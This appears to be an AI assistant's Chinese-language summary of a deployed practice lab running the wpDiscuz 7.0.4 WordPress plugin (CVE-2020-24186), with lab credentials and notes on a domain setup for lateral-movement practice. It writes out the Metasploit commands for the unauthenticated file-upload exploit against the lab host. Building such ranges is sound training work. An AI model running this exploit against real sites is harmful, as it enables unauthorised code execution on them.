wpDiscuz CVE-2020-24186 漏洞靶场已成功部署在 victim1 (172.30.0.12) 上。                                                                                                           
                                                                                                                                                                                    
✅ 验证结果                                                                                                                                                                       
                                                                                                                                                                                  
- WordPress: ✅ 正常运行                                                                                                                                                          
- wpDiscuz 版本: ✅ 7.0.4 (易受攻击)                                                                                                                                              
- Apache: ✅ 运行中                                                                                                                                                               
- MySQL: ✅ 运行中                                                                                                                                                                
- DNS 解析: ✅ 内外网正常                                                                                                                                                         
                                                                                                                                                                                  
🎯 快速开始                                                                                                                                                                       
                                                                                                                                                                                  
访问靶场：                                                                                                                                                                        
# WordPress 前台                                                                                                                                                                  
http://172.30.0.12/                                                                                                                                                               
                                                                                                                                                                                  
# 管理后台                                                                                                                                                                        
http://172.30.0.12/wp-admin/                                                                                                                                                      
用户名: admin                                                                                                                                                                     
密码: admin123                                                                                                                                                                    
                                                                                                                                                                                  
# 测试文章（用于漏洞利用）                                                                                                                                                        
http://172.30.0.12/?p=5                                                                                                                                                           
                                                                                                                                                                                  
Metasploit 利用：                                                                                                                                                                 
msfconsole                                                                                                                                                                        
use exploit/unix/webapp/wp_wpdiscuz_unauthenticated_file_upload                                                                                                                   
set RHOSTS 172.30.0.12                                                                                                                                                            
set TARGETURI /                                                                                                                                                                   
set LHOST <YOUR_IP>                                                                                                                                                               
exploit                                                                                                                                                                           
                                                                                                                                                                                  
📚 文档位置                                                                                                                                                                       
                                                                                                                                                                                  
- 详细利用指南: EXPLOITATION_GUIDE.md                                                                                                                                             
- 部署总结: DEPLOYMENT_SUMMARY.txt                                                                                                                                                
- 部署文档: README.md                                                                                                                                                             
                                                                                                                                                                                  
💡 关键知识点                                                                                                                                                                     
                                                                                                                                                                                  
1. DNS 配置: 通过在域控配置 DNS 转发器，使域成员既能解析内网域名，又能访问外网资源                                                                                                
2. 域环境: victim1 作为域成员，可以进行域内横向移动练习                                                                                                                           
3. 漏洞类型: CVE-2020-24186 允许未经身份验证的任意文件上传                                                                                                                        
                                                                                                                                                                                  
🔗 相关文件                                                                                                                                                                       
                                                                                                                                                                                  
/home/lexuswang/ansible/wpDiscuz/                                                                                                                                                 
├── deploy_wpdiscuz.yml          # 主部署 playbook                                                                                                                                
├── configure_wordpress.yml       # WordPress 配置                                                                                                                                
├── EXPLOITATION_GUIDE.md         # 详细利用指南                                                                                                                                  
├── DEPLOYMENT_SUMMARY.txt        # 部署总结                                                                                                                                      
└── README.md                     # 使用文档                                                                                                                                      
                                                                                                                                                                                  
祝你渗透测试练习顺利！🚀 